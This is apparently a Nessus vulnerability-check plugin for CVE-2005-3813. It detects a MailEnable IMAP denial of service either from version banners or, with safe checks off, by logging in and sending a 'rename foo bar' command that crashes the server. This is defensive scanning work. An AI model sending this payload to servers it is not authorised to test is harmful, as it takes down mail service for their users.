#
# Josh Zlatin-Amishav
# GPLv2
#


  desc["english"] = "
Synopsis :

The remote IMAP server is prone to denial of service attacks. 

Description :

The remote host is running MailEnable, a commercial mail server for
Windows. 

The IMAP server bundled with the version of MailEnable Professional or
Enterprise Edition installed on the remote host is prone to crash due
to incorrect handling of mailbox names in the rename command.  An
authenticated remote attacker can exploit this flaw to crash the IMAP
server on the remote host. 

See also : 

http://www.securityfocus.com/archive/1/417589
http://www.mailenable.com/hotfix/MEIMAPS.ZIP

Solution : 

Apply the IMAP Cumulative Hotfix/Update provided in the zip file
referenced above. 

Risk factor : 

Low / CVSS Base Score : 1.3
(AV:R/AC:L/Au:R/C:N/I:N/A:P/B:N)";


if (description) {
  script_id(20245);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3813");
  script_bugtraq_id(15556);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"21109");
  }

  name["english"] = "MailEnable IMAP rename DoS Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for rename DoS vulnerability in MailEnable's IMAP service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2005 Josh Zlatin-Amishav");

  script_dependencie("find_service.nes");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_exclude_keys("imap/false_imap");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");

user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # nb: we won't do a banner check unless report_paranoia is 
  #     set to paranoid since the hotfix doesn't update the banner.
  if (report_paranoia <= 1) exit(0);

  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(
      pattern:"Version: (0-+)?([0-9][^- ]+)-*",
      string:banner,
      icase:TRUE
    );
    if (ver == NULL) {
      if (log_verbosity > 1) debug_print("can't determine version of MailEnable's SMTP connector service!", level:0);
      exit(1);
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      if (log_verbosity > 1) debug_print("can't determine edition of MailEnable's SMTP connector service!", level:0);
      exit(1);
    }
    ver = ver[2];

    if (
      # nb: Professional versions <= 1.7 may be vulnerable.
      (edition == "Professional" && ver =~ "^1\.([0-6]|7$)") ||
      # nb: Enterprise versions <= 1.1 may be vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.(0|1$)")
    ) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of Mailenable\n",
        "***** installed there. Since the Hotfix does not change the version\n",
        "***** number, though, this might be a false positive.\n",
        "\n"
      );
      security_note(port:port, data:report);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s) || "IMAP4rev1 server ready at" >!< s )
  {
    close(soc);
    exit(0);
  }

  # Try to log in.
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s
  , icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }


  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;
    ++tag;
    payload = string("nessus", string(tag), " rename foo bar");
    send(socket:soc, data:string(payload, "\r\n"));
    # It may take some time for the remote connection to close
    # and refuse new connections
    sleep(5);
    # Try to reestablish a connection
    soc2 = open_sock_tcp(port);

    # There's a problem if we can't establish the connection 

    if (!soc2) {
      security_note(port);
      exit(0);
    }
    close(soc2);
  }
}
